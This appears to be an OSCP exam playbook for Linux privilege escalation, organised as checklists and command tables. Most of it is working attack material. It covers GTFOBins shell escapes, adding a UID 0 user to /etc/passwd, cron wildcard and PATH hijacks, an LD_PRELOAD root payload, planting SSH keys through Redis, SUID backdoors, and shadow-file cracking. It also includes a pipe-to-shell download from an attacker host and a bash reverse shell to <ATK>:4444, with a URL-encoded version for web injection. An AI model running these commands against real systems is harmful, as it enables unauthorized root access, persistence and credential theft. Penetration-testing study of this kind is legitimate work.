# Linux Privilege Escalation — OSCP Playbook

You have a shell as a low-priv user. Goal: root. Work the checks **top-down** — the cheap, common wins are first. Don't jump to kernel exploits until you've burned through manual enumeration and LinPEAS.

---

## Table of Contents
1. [First 60 Seconds — Stabilize & Orient](#first-60-seconds--stabilize--orient)
2. [Methodology (Chronological)](#methodology-chronological)
3. [Manual Enumeration Checklist](#manual-enumeration-checklist)
4. [Tools](#tools)
5. [LinPEAS — Deep Dive](#linpeas--deep-dive)
6. [Common OSCP Attack Paths](#common-oscp-attack-paths)
7. [Useful One-Liners & Payloads](#useful-one-liners--payloads)

---

## First 60 Seconds — Stabilize & Orient

1. **Upgrade to a proper TTY** (most reverse shells are dumb — `sudo`, `su`, vi etc. will fail without this):
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Background with Ctrl-Z, then:
   stty raw -echo; fg
   # In the returned shell:
   export TERM=xterm; export SHELL=bash
   stty rows 50 columns 200
   ```
   Or, if `script` is present (cleanest):
   ```bash
   script -q /dev/null /bin/bash
   ```

2. **Identify yourself & the box**:
   ```bash
   id; whoami; hostname; uname -a; cat /etc/os-release
   ```

3. **Run `sudo -l` first** — half the boxes end here.
   ```bash
   sudo -l
   ```

---

## Methodology (Chronological)

Run in order. Each "win" can root the box — don't skip ahead.

| # | Check | Command | Why |
|---|---|---|---|
| 1 | `sudo -l` (no password OR known password) | `sudo -l` | Misconfigured sudoers is the #1 OSCP path |
| 2 | SUID binaries | `find / -perm -4000 -type f 2>/dev/null` | Match against GTFOBins |
| 3 | SGID binaries | `find / -perm -2000 -type f 2>/dev/null` | Less common but check |
| 4 | Capabilities | `getcap -r / 2>/dev/null` | `cap_setuid+ep` on python/perl = root |
| 5 | Cron jobs | `cat /etc/crontab; ls -la /etc/cron.*` | Writable script run by root = root |
| 6 | Writable files owned by root | `find / -writable -type f -not -path '/proc/*' 2>/dev/null` | Hijack a script |
| 7 | Writable `/etc/passwd` or `/etc/shadow` | `ls -la /etc/passwd /etc/shadow` | Add a UID 0 user |
| 8 | Group memberships (docker, lxd, disk, adm, sudo) | `id; groups` | Group-based escalation paths |
| 9 | Readable SSH keys | `find / -name "id_rsa*" 2>/dev/null; ls -la ~/.ssh /root/.ssh /home/*/.ssh` | Key reuse / weak perms |
| 10 | Credentials in files | grep history, configs, scripts | Reused creds → su/SSH |
| 11 | Processes running as root | `ps auxf` + `pspy` | Background tasks, exposed services |
| 12 | Internal-only services | `ss -tlnp; ss -tlnp \| grep 127.0.0.1` | Often unauth'd (Redis, mysql, web admin) |
| 13 | NFS mounts (no_root_squash) | `cat /etc/exports` on server; `showmount -e <ip>` | Drop SUID binary from attacker |
| 14 | Kernel exploits | `uname -a` + LES | LAST RESORT — can crash the box |

---

## Manual Enumeration Checklist

### System Context
```bash
uname -a                          # kernel version → kernel exploits
cat /etc/os-release               # distro + version
cat /proc/version
hostname; hostnamectl
arch; dpkg --print-architecture   # 32/64-bit (matters for kernel exploits)
date; uptime
```

### Who Am I, What Can I Do
```bash
id                                # uid, gid, groups
whoami
groups
sudo -l                           # CRITICAL — run first, every time
sudo -ln                          # non-interactive (won't prompt)
```

### Users & Authentication
```bash
cat /etc/passwd | grep -v nologin | grep -v false      # interactive users
cat /etc/passwd | awk -F: '$3==0'                      # UID 0 (should only be root)
ls -la /home
cat /etc/shadow                                        # if readable = instant root
ls -la /etc/passwd /etc/shadow /etc/group              # check writability
getent passwd
last; lastlog | grep -v Never                          # who logs in
w; who
```

### Sudo
```bash
sudo -l
sudo -V                                                # sudo version → check CVE-2019-14287, CVE-2021-3156 (Baron Samedit)
```
**On every `sudo -l` entry, do this:**
1. Note the binary path
2. Note any `env_keep` or `setenv`
3. Note `NOPASSWD` (cred-free) vs needs password
4. Look it up at **GTFOBins → Sudo** (https://gtfobins.github.io)
5. Check for wildcards (`*`) — almost always abusable

Notable sudo flaws to test against the version:
- `CVE-2019-14287` — `sudo -u#-1 <cmd>` becomes UID 0 (sudo < 1.8.28)
- `CVE-2021-3156` Baron Samedit — heap overflow, sudo < 1.9.5p2

### SUID / SGID
```bash
find / -perm -4000 -type f 2>/dev/null                 # SUID
find / -perm -2000 -type f 2>/dev/null                 # SGID
find / -perm -u=s -type f 2>/dev/null                  # alt syntax
find / -perm /6000 -type f 2>/dev/null                 # both
ls -la /usr/bin /usr/sbin /usr/local/bin | grep -E '^-..s|^-.....s'
```

**Cross-reference output against GTFOBins → SUID.** Common SUID wins:
| Binary | Exploit |
|---|---|
| `nmap` (old, <5.2) | `nmap --interactive` then `!sh` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim`/`vi` | `vim -c ':!/bin/sh -p'` |
| `nano` | shell escape via `^R ^X` |
| `less`/`more` | `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `python`/`python3` | `python -c 'import os;os.execl("/bin/sh","sh","-p")'` |
| `perl` | `perl -e 'exec "/bin/sh","-p"'` |
| `bash` | `bash -p` |
| `cp` | overwrite `/etc/passwd` or `/etc/shadow` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `env` | `env /bin/sh -p` |
| `man` | `!sh` |

**Custom SUID binaries** (in `/opt`, `/usr/local/bin`, weird names): inspect with `strings`, `ltrace`, `strace`. Look for:
- `system()` / `exec()` calls with **relative paths** → PATH hijack
- Hardcoded commands → can you create matching binary earlier in PATH?

### Capabilities
```bash
getcap -r / 2>/dev/null
/sbin/getcap -r / 2>/dev/null
```

| Capability | Exploit |
|---|---|
| `cap_setuid+ep` on `python` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_setuid+ep` on `perl` | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'` |
| `cap_dac_read_search` | read any file (e.g. `/etc/shadow`) |
| `cap_sys_admin` | many — mount things |
| `cap_net_raw` | raw sockets (less useful for root) |

GTFOBins → Capabilities lists more.

### Cron Jobs (huge OSCP path)
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/cron.d/*
crontab -l                                             # current user
sudo crontab -l                                        # if sudo
ls -la /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all                            # systemd timers (modern cron)
```

**For every cron entry, check:**
1. Who runs it (user column in `/etc/crontab`)
2. Is the **script writable**? `ls -la <script>`
3. Is the script's **directory writable**? (you can swap it)
4. Does it use a **relative path** in a wildcard? (`* * * * * root tar czf /backup/* /var/log` — wildcard injection!)
5. Does the cron run a binary without absolute path? PATH hijack opportunity.

**Watch what's actually running** (cron jobs <1 min, anything periodic):
```bash
# Run pspy as low-priv — it shows ALL processes including root's, no priv needed
./pspy64 -pf -i 1000
```

### Writable Paths & PATH Hijacking
```bash
# Files you can write that are owned by root
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "$HOME"

# Directories in PATH you can write to (DANGER: prepend = hijack)
echo $PATH | tr ':' '\n' | while read p; do
  [ -w "$p" ] && echo "WRITABLE: $p"
done

# World-writable directories
find / -type d -perm -0002 2>/dev/null | grep -v /proc
```

**PATH hijack pattern:** if a root-run script calls `service` instead of `/usr/sbin/service`, and `/tmp` (or your `$HOME`) is earlier in PATH:
```bash
echo '/bin/bash -p' > /tmp/service && chmod +x /tmp/service
export PATH=/tmp:$PATH
# trigger the script
```

### Group Memberships → Root
| Group | How to escalate |
|---|---|
| `sudo`, `wheel`, `admin` | `sudo -l` |
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` / `lxc` | Mount host `/` into container, chroot |
| `disk` | `debugfs /dev/sda1` → cat `/etc/shadow` |
| `adm` | Read logs (`/var/log/auth.log` etc.) — creds in logs |
| `video` | Screenshot, but less useful |
| `shadow` | Read `/etc/shadow` directly |
| `root` group (gid 0) | Often writable root-owned files |

**LXD/LXC** (full root path):
```bash
# On attacker:
git clone https://github.com/saghul/lxd-alpine-builder; cd lxd-alpine-builder; sudo ./build-alpine
# Transfer the tar.gz to victim, then:
lxc image import alpine-*.tar.gz --alias myimg
lxc init myimg pwn -c security.privileged=true
lxc config device add pwn host-root disk source=/ path=/mnt/root recursive=true
lxc start pwn
lxc exec pwn /bin/sh
# inside: cd /mnt/root → full host filesystem as root
```

### SSH Keys & Reuse
```bash
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
ls -la /root/.ssh 2>/dev/null                          # readable? (sometimes!)
cat ~/.ssh/authorized_keys
cat ~/.bash_history | grep -i ssh
```
- Found a key? Try every user: `ssh -i key user@<host>` (test against `cat /etc/passwd`)
- Weak/no passphrase on a key → `ssh2john id_rsa > rsa.hash && john rsa.hash`

### Credentials in Files
```bash
# History
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history 2>/dev/null
history

# Config files with creds
grep -RinE 'password|passwd|secret|api[_-]?key|token' /etc /opt /home /var/www 2>/dev/null | grep -v Binary
grep -RinE 'password|passwd|pwd' /var/log 2>/dev/null

# Web app config — high-yield
find / -name "wp-config.php" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "config.php" -o -name "settings.php" -o -name "database.yml" 2>/dev/null

# Backups
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null
find / -name "*.sql" -o -name "*.db" -o -name "*.sqlite*" 2>/dev/null

# Mail (sometimes contains password resets / creds)
ls -la /var/mail /var/spool/mail 2>/dev/null
cat /var/mail/*
```

**Reuse pattern:** any password you find → try as:
- root password (`su -`)
- other local users (`su <user>`)
- key passphrase for found keys
- DB password for found DB
- SMB/AD if you're pivoting

### Processes & Internal Services
```bash
ps auxf
ps -ef --forest
ps aux | grep root                                     # what runs as root?

ss -tlnp                                               # listening TCP w/ process (if priv)
ss -tln                                                # always works
ss -tunlp                                              # all (TCP + UDP)
netstat -tunlp 2>/dev/null

# Local-only services (firewalled from outside = often unauth)
ss -tln | grep 127.0.0.1
```

**For each internal service:** is there a default-cred / unauth admin endpoint? Common:
- :3306 mysql (`mysql -u root` — sometimes no pw locally)
- :5432 postgres
- :6379 redis (`redis-cli` → write SSH key to `/root/.ssh/authorized_keys`)
- :11211 memcached
- :8080/8000/8888 internal web (often admin panels)
- :9090 prometheus (no auth by default)
- :2375 docker daemon (unauth = container escape = root)

Use SSH local port forward to access from your Kali:
```bash
ssh -L 6379:127.0.0.1:6379 user@victim
```

### Mounts & Filesystems
```bash
mount
cat /etc/fstab
cat /etc/mtab
df -h
lsblk
# NFS exports (from attacker side, against victim if it's the NFS server)
showmount -e <IP>
```

**NFS `no_root_squash`** → mount the export on your attacker, drop a SUID-root shell, run it on victim:
```bash
# On attacker (assume export /shared, no_root_squash):
sudo mkdir /mnt/nfs && sudo mount -t nfs <IP>:/shared /mnt/nfs
cp /bin/bash /mnt/nfs/bash && sudo chown root:root /mnt/nfs/bash && sudo chmod +s /mnt/nfs/bash
# On victim:
/shared/bash -p
```

### Containers — Am I Inside One?
```bash
ls -la /.dockerenv                                     # docker indicator
cat /proc/1/cgroup | grep -E 'docker|lxc|kubepods'
cat /proc/self/status | grep CapEff                    # capabilities
```
If yes: check for privileged container, mounted Docker socket (`/var/run/docker.sock`), `SYS_ADMIN` cap, host filesystem mounts.

### Kernel Exploits (LAST RESORT)
```bash
uname -a                                               # version + arch
cat /proc/version
lsb_release -a
```

Run **Linux Exploit Suggester 2** offline against the kernel version:
```bash
# On attacker:
./linux-exploit-suggester.sh -k 5.4.0-42-generic
```
Or copy `les.sh` over and run locally.

**Known exam-era ones to recognize (only if kernel matches):**
- DirtyCow (CVE-2016-5195) — kernel <4.8.3
- DirtyPipe (CVE-2022-0847) — kernel 5.8 → 5.16.11 / 5.15.25 / 5.10.102
- PwnKit (CVE-2021-4034) — `pkexec` (SUID, almost universal on older boxes)
- OverlayFS (CVE-2021-3493, CVE-2023-0386)
- nf_tables (CVE-2022-32250)
- Sequoia (CVE-2021-33909)

**PwnKit** is a near-guaranteed win on older Ubuntu/Debian:
```bash
ls -la /usr/bin/pkexec                                 # SUID? often yes
# https://github.com/ly4k/PwnKit — single static binary
./pwnkit
```

**Caveat:** kernel exploits can crash the box. Snapshot/restart cost on OSCP is high. Try everything else first.

---

## Tools

### LinPEAS (linpeas.sh)
**The single most useful auto-enumeration script.** Runs ~hundreds of checks, color-codes findings. See [LinPEAS Deep Dive](#linpeas--deep-dive) below.

```bash
# Get it on victim (no internet from victim? host it on Kali):
# Kali:
sudo python3 -m http.server 80
# Victim:
curl http://<KALI>/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/lp.out
# Or in one shot:
curl -L http://<KALI>/linpeas.sh | sh
```

**Flags:**
- `-a` — all checks (slower, more thorough). **Use this on OSCP.**
- `-s` — superfast (skip slow stuff like file searches)
- `-q` — quiet (no banners)
- `-o <SECTION>` — only run a section (e.g. `-o sudo`)
- `-e` — extra checks
- `-P <password>` — pass password for `sudo -l` (rare)

### LinEnum
Older, simpler — still useful as a sanity check or when LinPEAS errors.
```bash
./LinEnum.sh -t -k password -r report.txt
# -t thorough, -k search files for keyword, -r write report
```

### pspy (no-priv process spy)
Watch processes — including root's — without root. **Essential for finding cron jobs <1 min, transient root processes.**
```bash
./pspy64 -pf -i 1000          # -p processes -f file events -i poll interval(ms)
./pspy64 -pf -i 100           # tighter interval, more noise
```
Pre-built static binaries on the pspy GitHub releases page.

### Linux Smart Enumeration (lse.sh)
Tiered output (`-l0`, `-l1`, `-l2`) — less noisy than LinPEAS.
```bash
./lse.sh -l 2 -i              # interactive
```

### Linux Exploit Suggester 2 (les.sh / les2.pl)
Kernel-version → known exploits.
```bash
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh -k 5.4
./linux-exploit-suggester-2.pl -k 5.4 -d              # detailed
```

### GTFOBins (https://gtfobins.github.io)
Reference site. Lookup any SUID/sudo/cap binary you find. **Memorize the URL** — you'll use it dozens of times.

### Bash Built-in Enumerators (if no upload possible)
```bash
# Quick SUID one-liner (no scripts needed):
for b in $(find / -perm -4000 -type f 2>/dev/null); do echo "[+] $b"; done

# Quick cron scan:
ls -la /etc/cron* /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
```

---

## LinPEAS — Deep Dive

LinPEAS dumps a *lot*. Knowing what to scan for makes it usable. Output is grouped into sections; **color = severity**:

- **RED on YELLOW** background: 95%+ chance of privesc — drop everything and exploit
- **RED**: likely vector
- **YELLOW**: known CVE / interesting
- **BLUE/CYAN**: informational
- **GREEN**: hardened / benign

Always pipe to a file for searching: `./linpeas.sh -a | tee linpeas.out` then `grep -i -E 'red|95%' linpeas.out`.

### Section-by-Section: What to Look For

#### `System Information`
- Kernel version → cross-check LES for known exploits
- Distro + version → match to ESC paths (PwnKit on Ubuntu, etc.)
- `sudo --version` line → CVE-2021-3156 if < 1.9.5p2
- `Is this a virtual machine` — affects some exploits

#### `Available Software`
- Look for compilers (`gcc`, `cc`) — needed for kernel exploits
- Languages with `setuid` capability (`perl`, `python3`)
- `wget`, `curl`, `nc`, `socat` — for file transfer/shells
- Outdated package versions — `apt list --installed` cross-ref

#### `Operative System`
- 32-bit vs 64-bit (kernel exploit binaries must match)

#### `Container` / `AppArmor` / `SELinux` / `Cgroups`
- `Is this a docker container?` — yes → check for socket mounts, privileged
- AppArmor/SELinux enforcing? — restricts exploits
- `Cleaned potentially dangerous capabilities` — note what's NOT dropped

#### `Logged users`, `Last logged users`
- Other users active — possible session hijacking via tty
- `w` output → if root's TTY is writable (rare but possible)

#### `Sudo version`
- `1.8.27` and below → CVE-2019-14287 (`sudo -u#-1`)
- `< 1.9.5p2` → CVE-2021-3156 (Baron Samedit)

#### `PATH`
- Anything in PATH **before** `/usr/bin` that's writable = hijack opportunity
- `.` in PATH (relative current dir) = bad — drop a binary, wait for root execution

#### `Date & Uptime`
- Recent reboot → cron jobs may have just run / about to run; pspy now

#### `Networking`
- **Internal-only listeners** (127.0.0.1 / ::1) — SSH-forward and attack
- Unusual ports — fingerprint the service
- `iptables` rules — what's actually filtered?

#### `Users Information`
- Other UID 0 accounts (not just `root`) — sometimes added by misconfig
- Users with `/bin/bash` shells you haven't tried
- Last password change dates — stale = often reused

#### `Sudo`
- **READ EVERY LINE.** This is the most common win.
- `(ALL : ALL) NOPASSWD: ALL` → `sudo -i`
- `(root) NOPASSWD: /usr/bin/<X>` → GTFOBins lookup for X
- `env_keep += "LD_PRELOAD"` or `LD_LIBRARY_PATH` → LD_PRELOAD attack
- Wildcards in command → injection (e.g. `tar` wildcard injection)

#### `CVEs Check` / `Vulnerable Software`
- Linpeas highlights known-vulnerable versions. Verify, don't blindly run.

#### `Interesting Files`
- **SUID files** — cross-check GTFOBins. Anything non-standard (in `/opt`, custom name) → investigate.
- **SGID files** — same logic, less common
- **Capabilities** — `cap_setuid+ep` on anything = instant root via that binary
- **Files with ACLs** — `getfacl` to confirm; might be writable when `ls -la` suggests not
- **NFS exports** w/ `no_root_squash` → drop SUID from attacker
- **`uncommon`/`unexpected`** files in `/etc` or `/root` — investigate

#### `Cron`
- `/etc/crontab` entries running as root — if script or its directory is writable, you win
- **Wildcards in cron commands** — wildcard injection
- Systemd timers — same logic
- Watch with `pspy` for stuff cron itself doesn't list (anacron, dynamic)

#### `Services`
- Services running as root — check write perms on the binaries/configs
- Custom services in `/etc/systemd/system/*.service` — `ExecStart=` path writable?
- `systemd` exploits if version vulnerable

#### `Timers`
- Same as cron but systemd. Often missed.

#### `Sockets`
- Unix sockets — `/var/run/docker.sock` accessible = root
- Custom sockets → connect with `nc -U <path>` and probe

#### `D-Bus`
- DBus services running as root — rare on OSCP but possible (PwnKit is dbus-adjacent)

#### `Network Information`
- ARP table → other hosts to pivot to
- `/etc/hosts` aliases → might reveal internal services

#### `Interesting Processes`
- Processes running as root with **arguments revealing** creds (e.g., `mysql -u root -psecret`)
- Java/Python web apps → source code on disk

#### `Software Information`
- Web apps — check version vs known CVEs
- Database versions — Redis < 6 unauth by default

#### `Container` (again)
- `--privileged` mode → mount `/dev/sda1` → root host

#### `Permissions Hijack`
- Writable PATH dirs
- LD_PRELOAD / LD_LIBRARY_PATH writable
- Python/Perl module hijack — writable site-packages dir in `sys.path`

#### `Other interesting files`
- `id_rsa` keys found
- `.bash_history` / `.viminfo` / `.lesshst` with creds
- `*.conf` files referencing passwords
- World-writable files in unusual places

#### `Searching passwords`
- LinPEAS greps for password-y strings across common dirs. **Read every hit.**

#### `API Keys / Cloud creds`
- `.aws/credentials`, `.gcp/`, `.kube/config` — pivot or directly useful

### Recommended LinPEAS Workflow
1. Run `linpeas.sh -a | tee /tmp/lp.out` (or `-a -e` for extra)
2. **First pass:** open `lp.out`, search for `RED` highlights / `95%` / `YES`
3. **Second pass:** read the Sudo, SUID, Capabilities, Cron sections in full
4. **Third pass:** check Interesting Files (esp. searching for passwords / keys)
5. **Fourth pass:** Network listeners, services, timers — pivot/internal attack surface
6. If nothing: run `pspy` for 5–10 min while doing other things
7. Last resort: kernel exploit from LES

---

## Common OSCP Attack Paths

### 1. Sudo Misconfiguration (most common)
- `sudo -l` shows a command runnable as root
- GTFOBins → Sudo → exact escalation

**Common ones:**
| Binary | Sudo exploit |
|---|---|
| `sudo vim` | `sudo vim -c ':!/bin/sh'` |
| `sudo find` | `sudo find . -exec /bin/sh \; -quit` |
| `sudo less` | `sudo less /etc/hosts` → `!sh` |
| `sudo awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `sudo apt-get` | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
| `sudo systemctl` | `TERM= sudo systemctl status` → `!sh` (uses pager) |
| `sudo cp` | overwrite `/etc/passwd` with hash for new root user |
| `sudo nmap` (interactive mode, old) | `sudo nmap --interactive` then `!sh` |

### 2. SUID Binary Abuse
Same logic — find SUID, look up GTFOBins → SUID.

### 3. Capability Abuse
`cap_setuid+ep` on any interpreter = root.
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 4. Writable /etc/passwd
Add a root user with known password:
```bash
openssl passwd -1 -salt hax mypass        # generates: $1$hax$xxx
echo 'pwn:$1$hax$xxx:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn      # password: mypass → UID 0
```

### 5. Writable /etc/shadow
Replace root's hash:
```bash
openssl passwd -6 mypass                   # SHA-512 → $6$...
# Edit /etc/shadow, replace root line second field with the hash
su root                                    # password: mypass
```

### 6. Cron Job — Writable Script
Cron runs `/opt/backup.sh` as root, and you can write to it:
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
# Wait for cron, then:
/tmp/rootbash -p
```

### 7. Cron Job — Wildcard Injection
Cron: `* * * * * root tar czf /backup/all.tgz /var/www/*`
```bash
cd /var/www
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh shell.sh"
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' > shell.sh
# When cron fires: /tmp/rb -p → root
```

### 8. PATH Hijack via Cron / SUID
Root cron calls `service` (relative path). `/tmp` is in root's PATH or you can write to a PATH dir:
```bash
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### 9. LD_PRELOAD (sudo env_keep)
If `sudo -l` shows `env_keep+=LD_PRELOAD`:
```c
// preload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/pre.so preload.c
sudo LD_PRELOAD=/tmp/pre.so <whatever-binary-is-allowed>
```

### 10. NFS no_root_squash
See [Mounts](#mounts--filesystems) above — mount export on attacker, drop SUID, run on victim.

### 11. Docker / LXD Group
See [Group Memberships](#group-memberships--root).

### 12. Kernel Exploit
PwnKit, DirtyPipe, DirtyCow — only if kernel matches. Confirm version, compile statically off-box, transfer, run.

### 13. Service Credentials in Files
DB password in `wp-config.php` / `.env` → try as root password (`su -`) and other users. Reuse is the #1 underrated path.

### 14. Internal Service (Redis Unauth)
```bash
# Local redis on victim, no auth:
redis-cli
> config set dir /root/.ssh/
> config set dbfilename "authorized_keys"
> set x "\n\nssh-rsa AAAA...your_pubkey...\n\n"
> save
# Now SSH in as root with your key
```

### 15. SSH Key Reuse
Found a `id_rsa` in another user's homedir — try it against `root@localhost` and every user in `/etc/passwd`.

---

## Useful One-Liners & Payloads

### Spawn TTY in any shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
script -q /dev/null /bin/bash
/bin/bash -i
SHELL=/bin/bash script -q /dev/null
```

### One-liner enumeration (no script upload)
```bash
echo "=== id ==="; id; \
echo "=== sudo -l ==="; sudo -ln; \
echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null; \
echo "=== caps ==="; getcap -r / 2>/dev/null; \
echo "=== cron ==="; cat /etc/crontab; ls -la /etc/cron.d/; \
echo "=== writable in PATH ==="; for p in $(echo $PATH | tr : ' '); do [ -w "$p" ] && echo $p; done; \
echo "=== world-writable ==="; find / -type f -perm -o+w -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -50
```

### Make a SUID-root backdoor (after gaining root once)
```bash
cp /bin/bash /tmp/rb && chmod +s /tmp/rb
# Anyone:
/tmp/rb -p
```

### File transfer to victim
```bash
# Attacker:
sudo python3 -m http.server 80
# Victim:
curl http://<ATK>/linpeas.sh -o /tmp/lp.sh
wget http://<ATK>/file -O /tmp/file
# No curl/wget? Try:
exec 3<>/dev/tcp/<ATK>/80; echo -e "GET /file HTTP/1.1\r\nHost: <ATK>\r\n\r\n" >&3; cat <&3 > file
```

### Reverse shell (if you only have command exec)
```bash
bash -c 'bash -i >& /dev/tcp/<ATK>/4444 0>&1'
# Url-encoded for web injection:
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<ATK>%2F4444%200%3E%261%22
```

### Reading files when you can't `cat`
```bash
# As another user (when SUID gives you uid but not full shell):
xxd /etc/shadow
od -c /etc/shadow
less /etc/shadow            # if less is around
awk '{print}' /etc/shadow
```

### Crack /etc/shadow
```bash
unshadow /etc/passwd /etc/shadow > unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
hashcat -m 1800 hashes /usr/share/wordlists/rockyou.txt    # sha512crypt
```
